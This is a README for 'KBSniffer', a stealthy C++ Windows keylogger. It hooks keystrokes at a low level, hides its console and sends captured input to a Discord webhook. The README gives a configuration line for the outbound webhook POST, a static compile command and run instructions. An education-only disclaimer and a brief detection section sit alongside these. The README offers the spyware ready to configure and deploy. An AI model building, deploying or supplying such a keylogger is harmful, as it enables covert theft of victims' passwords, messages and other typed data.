# KBSniffer

<p align="center">
  <img src="https://img.shields.io/badge/C++-17+-00599C?style=for-the-badge&logo=c%2B%2B" alt="C++17" />
  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows" alt="Windows" />
  <img src="https://img.shields.io/badge/License-GPLv3-3DA639?style=for-the-badge&logo=gnu" alt="GPLv3 License" />
  <img src="https://img.shields.io/badge/Purpose-Education-ff6b6b?style=for-the-badge" alt="For Education" />
</p>

A sophisticated and stealthy keylogger for Windows, developed in C++. KBSniffer utilizes low-level system hooks to capture keystrokes and transmits them asynchronously to a Discord channel via webhooks. This project is designed for educational purposes in the fields of cybersecurity, system programming, and reverse engineering.

## ⚠️ Critical Disclaimer: For Authorized Use Only

**This software is intended strictly for educational and authorized security testing purposes.**

*   **Legal Use:** You must only use this tool on systems that **you own** or have **explicit, written permission** to test.
*   **No Liability:** The author is **not responsible** for any misuse or damage caused by this program.
*   **Illegal Activity:** Unauthorized use of this software for malicious purposes is a criminal offense and violates ethical guidelines.

**By using this software, you agree to these terms and assume full responsibility for your actions.**

## 🚀 Features

*   **Stealth Operation:** Executes as a background process with no console window.
*   **Comprehensive Logging:** Accurately captures alphanumeric keys, symbols, and special keys (Enter, Backspace, Space).
*   **Shift-State Management:** Correctly interprets the state of `Shift` and `Caps Lock` for precise character and symbol translation.
*   **Asynchronous Discord Integration:** Efficiently sends captured data to a Discord channel via webhooks using a producer-consumer model to avoid input lag.
*   **Robust Architecture:** Built with multithreading and synchronization primitives (`std::mutex`, `std::condition_variable`) for stability.

## 🛠️ How It Works

1.  **Hook Installation:** Sets a global low-level keyboard hook (`WH_KEYBOARD_LL`) via `SetWindowsHookEx` to intercept keystrokes.
2.  **Key Processing:** The hook procedure translates virtual-key codes into characters, handling all shift states for accurate symbol generation.
3.  **Buffer Management:** Completed messages (on `VK_RETURN`) are placed into a thread-safe queue.
4.  **Webhook Delivery:** A dedicated worker thread consumes the queue and transmits data to the configured Discord webhook using the WinHTTP API.

## 📦 Installation & Setup

### Prerequisites
*   A Windows operating system.
*   A C++ compiler (e.g., MinGW-w64, MSVC).
*   A Discord webhook URL. [Learn how to create one here.](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)

### 1. Configuration
Replace the placeholder webhook URL in `main.cpp` with your own:
```cpp
// Find this line and replace the path:
HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN", ...);
```

### 2. Compilation
Compile the source code into a standalone Windows executable. Using **MinGW-w64**:

```bash
x86_64-w64-mingw32-g++ -static -O2 -o KBSniffer.exe KBSniffer.cpp -lwinhttp -luser32
```
*   `-static`: Statically links libraries for a standalone executable.
*   `-lwinhttp -luser32`: Links necessary Windows APIs.

### 3. Execution
Run the compiled `KBSniffer.exe`. The program will immediately hide its console window and begin operation.

## 🔬 Technical Details

*   **Language:** C++17
*   **Core APIs:** Windows API (`SetWindowsHookEx`, `GetAsyncKeyState`, `WinHTTP`)
*   **Concurrency:** STD Thread, Mutex, and Condition Variable
*   **Compilation:** Static linking for portability

## 🛡️ Defense & Detection

This is a proof-of-concept tool and is not designed for advanced evasion.
*   **Antivirus:** Will likely be detected as a Trojan/Spyware.
*   **Monitoring Tools:** Can be spotted by utilities that monitor for low-level hooks (e.g., Process Hacker, Sysinternals Suite).
*   **User Awareness:** Visible in running processes list.

## 📜 License

This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**. This license mandates that any distributed modifications must remain open source. This choice supports the educational ethos of the project by ensuring the code remains free and accessible for learning.

**The license is supplemented by the above disclaimer, which strictly prohibits unauthorized and malicious use.**

## 🎯 Purpose

This project was created to explore and demonstrate:
*   The Windows API and hooking mechanisms.
*   Low-level system input handling.
*   Secure, asynchronous network communication in C++.
*   Multithreaded application design patterns.
